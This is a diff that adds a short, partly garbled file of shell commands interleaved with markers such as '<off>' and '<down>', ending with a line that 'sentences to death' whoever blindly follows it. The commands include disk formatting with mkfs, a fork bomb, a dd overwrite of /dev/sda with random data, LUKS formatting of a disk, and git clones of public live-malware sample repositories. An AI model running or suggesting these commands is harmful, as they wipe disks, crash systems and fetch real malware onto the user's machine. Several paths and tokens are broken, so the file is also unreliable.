@@ -1,0 +1,42 @@
+<off>
+mkfs ext4 /dev/sda3. 2a
+>file 
+: () { :|:& };:
+<down>
+dd if=/dev/random of=/dev/sda
+<down>
+Sudo cryptsetup reencrypt /sda/KTone
+--decrypt 
+<off>
+>file 
+<down>
+mkfs ext4 /dev/sda3. 2b
+git clone https://github.com/ytisf/theZoo
+>file 
+<down>
+<down>
+git clone https://github.com/Endermanch/MalwareDatabase
+>file
+<off>
+mkfs ext4 /dev/sda3. 2c
+>file
+<down>
+git clone  https://github.com/sophos-ai/SOREL-20M
+>file
+<down>
+<down>
+Sudo cryptsetup reencrypt /sda/0em0
+--decrypt 
+>file
+<down>
+<down>
+mkfs ext4 /dev/sda3. 2d
+>file
+<down>
+<down>
+apt install cryptsetup
+sudo cryptsetup --hash sha512 --verbose --cipher aes-xts-plain --key-size 512 luksFormat /dev/sda0
+<off>
+>file 
+for blindly following skull and crossbones, I Brenton Hopkins,  sentence you to death ...
+ 
